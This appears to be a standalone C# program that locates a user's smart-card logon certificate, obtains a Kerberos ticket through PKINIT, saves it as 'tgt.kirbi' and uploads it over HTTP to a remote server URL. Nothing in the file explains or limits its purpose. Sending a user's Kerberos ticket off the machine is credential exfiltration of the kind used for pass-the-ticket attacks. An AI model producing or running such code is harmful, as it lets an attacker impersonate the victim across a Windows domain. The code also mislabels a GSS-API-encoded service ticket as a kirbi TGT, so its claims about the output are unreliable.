using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using Kerberos.NET.Client;
using Kerberos.NET.Credentials;

public class SmartCardTGTExporter
{
    private static readonly string ServerUrl = "https://company-website/upload";
    private static readonly string LogFile = Path.Combine(Path.GetTempPath(), "smartcard_debug.log");

    public static async Task Main(string[] args)
    {
        WriteLog("=== Application Started ===");
        WriteLog($"Timestamp: {DateTime.Now}");
        WriteLog($"Working Directory: {Directory.GetCurrentDirectory()}");

        try
        {
            WriteLog("Starting smartcard lookup...");

            X509Certificate2 cert = FindSmartCardCertificate();
            if (cert == null)
            {
                WriteLog("ERROR: No smart card certificate with logon EKU found.");
                Console.WriteLine("No smart card certificate found. Check log at: " + LogFile);
                return;
            }

            WriteLog($"Found certificate: {cert.Subject}");
            Console.WriteLine($"Found certificate: {cert.Subject}");

            string upn = GetUpnFromCertificate(cert);
            if (string.IsNullOrEmpty(upn))
            {
                WriteLog("ERROR: Certificate does not contain a User Principal Name.");
                Console.WriteLine("No UPN found. Check log at: " + LogFile);
                return;
            }

            WriteLog($"UPN: {upn}");
            Console.WriteLine($"UPN: {upn}");

            string domain = upn.Split('@')[1];
            WriteLog($"Domain: {domain}");
            Console.WriteLine($"Domain: {domain}");

            WriteLog("About to request TGT (PIN prompt should appear now)...");
            Console.WriteLine("About to request TGT...");

            byte[] kirbiBytes = await RequestTgtViaPkinit(cert, upn, domain);

            WriteLog($"Successfully got TGT, size: {kirbiBytes.Length} bytes");
            Console.WriteLine($"Successfully got TGT, size: {kirbiBytes.Length} bytes");

            string kirbiPath = Path.Combine(Path.GetTempPath(), "tgt.kirbi");
            File.WriteAllBytes(kirbiPath, kirbiBytes);
            WriteLog($"TGT saved to {kirbiPath}");
            Console.WriteLine($"TGT saved to {kirbiPath}");

            await Send2Server(kirbiBytes);
            WriteLog("SUCCESS: TGT sent to server");
            Console.WriteLine("SUCCESS: TGT sent to server");
        }
        catch (Exception ex)
        {
            WriteLog($"EXCEPTION: {ex.GetType().Name}");
            WriteLog($"Message: {ex.Message}");
            WriteLog($"Stack Trace: {ex.StackTrace}");
            if (ex.InnerException != null)
            {
                WriteLog($"Inner Exception: {ex.InnerException.Message}");
            }

            Console.WriteLine($"ERROR: {ex.Message}");
            Console.WriteLine($"Full log saved to: {LogFile}");
        }
    }

    private static void WriteLog(string message)
    {
        try
        {
            File.AppendAllText(LogFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] {message}\n");
        }
        catch { }
    }

    private static X509Certificate2 FindSmartCardCertificate()
    {
        WriteLog("FindSmartCardCertificate: Starting...");
        X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
        store.Open(OpenFlags.ReadOnly);
        WriteLog($"FindSmartCardCertificate: Found {store.Certificates.Count} certificates");

        foreach (X509Certificate2 cert in store.Certificates)
        {
            WriteLog($"Checking cert: {cert.Subject}, HasPrivateKey: {cert.HasPrivateKey}");
            if (cert.HasPrivateKey && HasSmartCardEKU(cert))
            {
                WriteLog($"MATCH FOUND: {cert.Subject}");
                return new X509Certificate2(cert);
            }
        }
        WriteLog("FindSmartCardCertificate: No matching certificate found");
        return null;
    }

    private static bool HasSmartCardEKU(X509Certificate2 cert)
    {
        foreach (var extension in cert.Extensions.OfType<X509EnhancedKeyUsageExtension>())
        {
            foreach (var oid in extension.EnhancedKeyUsages)
            {
                WriteLog($"  EKU OID: {oid.Value}");
                if (oid.Value == "1.3.6.1.4.1.311.20.2.2")
                    return true;
            }
        }
        return false;
    }

    private static string GetUpnFromCertificate(X509Certificate2 cert)
    {
        foreach (X509Extension extension in cert.Extensions)
        {
            if (extension.Oid.Value == "2.5.29.17")
            {
                string san = extension.Format(true);
                foreach (string line in san.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
                {
                    if (line.Contains("Principal Name=") || line.Contains("UPN="))
                    {
                        int idx = line.IndexOf('=');
                        if (idx >= 0)
                        {
                            string upn = line.Substring(idx + 1).Trim();
                            WriteLog($"Found UPN: {upn}");
                            return upn;
                        }
                    }
                }
            }
        }
        return null;
    }

    private static readonly Random _random = new Random();

    private static async Task<byte[]> RequestTgtViaPkinit(X509Certificate2 cert, string upn, string domain)
    {
        const int maxRetries = 3;
        const int initialDelayMs = 1000;

        WriteLog("RequestTgtViaPkinit: Starting...");

        // Input validation
        if (cert == null || string.IsNullOrWhiteSpace(upn) || string.IsNullOrWhiteSpace(domain))
            throw new ArgumentException("Invalid certificate, UPN, or domain");
        if (!upn.Contains("@"))
            throw new ArgumentException("UPN must be in user@domain format");

        Exception lastException = null;

        for (int attempt = 0; attempt < maxRetries; attempt++)
        {
            KerberosClient client = null;
            try
            {
                WriteLog($"RequestTgtViaPkinit: Attempt {attempt + 1}/{maxRetries}");

                WriteLog("RequestTgtViaPkinit: Creating KerberosClient...");
                client = new KerberosClient();

                WriteLog("RequestTgtViaPkinit: Creating credential...");
                var credential = new KerberosAsymmetricCredential(cert, domain);

                WriteLog("RequestTgtViaPkinit: Authenticating...");
                await client.Authenticate(credential);

                WriteLog("RequestTgtViaPkinit: Getting service ticket...");
                string spn = $"krbtgt/{domain}";
                var serviceTicket = await client.GetServiceTicket(spn);

                if (serviceTicket == null)
                    throw new InvalidOperationException("Failed to retrieve service ticket");

                WriteLog("RequestTgtViaPkinit: Encoding ticket...");
                byte[] encoded = serviceTicket.EncodeGssApi().ToArray();

                if (encoded == null || encoded.Length == 0)
                    throw new InvalidOperationException("Encoded service ticket is empty");

                WriteLog($"RequestTgtViaPkinit: SUCCESS - got {encoded.Length} bytes");
                return encoded;
            }
            catch (Exception ex) when (attempt < maxRetries - 1)
            {
                lastException = ex;
                WriteLog($"RequestTgtViaPkinit: Attempt {attempt + 1} failed: {ex.Message}");

                int delayMs = initialDelayMs * (int)Math.Pow(2, attempt);
                int jitterMs = _random.Next(0, delayMs / 2);

                WriteLog($"RequestTgtViaPkinit: Retrying in {delayMs + jitterMs}ms...");
                await Task.Delay(delayMs + jitterMs);
            }
            finally
            {
                client?.Dispose();
            }
        }

        WriteLog($"RequestTgtViaPkinit: FAILED after {maxRetries} attempts");
        throw new InvalidOperationException(
            $"Failed to obtain TGT after {maxRetries} attempts",
            lastException);
    }

    private static async Task Send2Server(byte[] kirbiData)
    {
        WriteLog("Send2Server: Starting...");
        HttpClient httpClient = new HttpClient();
        MultipartFormDataContent content = new MultipartFormDataContent();
        ByteArrayContent fileContent = new ByteArrayContent(kirbiData);
        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
        content.Add(fileContent, "file", "tgt.kirbi");

        WriteLog($"Send2Server: Posting to {ServerUrl}");
        HttpResponseMessage response = await httpClient.PostAsync(ServerUrl, content);
        response.EnsureSuccessStatusCode();
        WriteLog("Send2Server: SUCCESS");
        Console.WriteLine("TGT successfully uploaded to server.");
    }
}
